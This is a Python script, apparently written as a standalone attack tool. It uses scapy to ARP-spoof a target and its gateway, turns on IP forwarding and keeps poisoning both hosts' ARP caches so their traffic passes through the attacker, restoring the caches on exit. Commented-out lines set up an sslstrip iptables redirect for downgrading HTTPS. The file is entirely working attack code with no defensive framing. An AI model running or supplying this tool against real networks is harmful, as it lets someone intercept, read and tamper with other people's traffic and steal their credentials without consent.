import scapy.all as scapy
import time
import os
import sys
import optparse
p=optparse.OptionParser()
p.add_option("--target",dest="target_ip",help="Type your target IP ")
p.add_option("--gateway",dest="gateway_ip",help="Type your gateway IP ")
(opt,arg) = p.parse_args()
sent_packets_count=0
os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
#check_https=raw_input("Do you want to start iptable rules for sslstrip (START SSLSTRIP AFTER SAYING YES) [yes/no] : ")
#sslstrip -k -l 8080
#if check_https == "yes" or "y":
	#os.system("iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080")
def get_mac(ip):
	arp_request=scapy.ARP(pdst=ip)
	broadcast=scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
	arp_broadcast_request=broadcast/arp_request
	answered_list  = scapy.srp(arp_broadcast_request,timeout=2,verbose=False)[0]
	return answered_list[0][1].hwsrc


def spoof(target_ip,gateway_ip):
	target_mac=get_mac(target_ip)
	packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac , psrc=gateway_ip)
	scapy.send(packet,verbose=False)
def restore(destination_ip,source_ip):
	destination_mac=get_mac(destination_ip)
	source_mac=get_mac(source_ip)
	packet=scapy.ARP(op=2 ,pdst=destination_ip,hwdst=destination_mac,psrc=source_ip,hwsrc=source_mac)
	scapy.send(packet,count=4,verbose=False)
try:
	while True:
		spoof(opt.target_ip,opt.gateway_ip)
		spoof(opt.gateway_ip,opt.target_ip)
		sent_packets_count = sent_packets_count + 2
		print "\r[+] Packets sent:",sent_packets_count,
		sys.stdout.flush()
		time.sleep(2)

except IndexError:
	while True:
		spoof(opt.target_ip,opt.gateway_ip)
		spoof(opt.gateway_ip,opt.target_ip)
		sent_packets_count = sent_packets_count + 2
		print "\r[+] Packets sent:",sent_packets_count,
		sys.stdout.flush()
		time.sleep(2)

except KeyboardInterrupt:
	print "\n[+] Deteccted CTRL+C !!!Quitting!!!"
	restore(opt.target_ip,opt.gateway_ip)
	restore(opt.gateway_ip,opt.target_ip)
	time.sleep(0.5)
	exit()
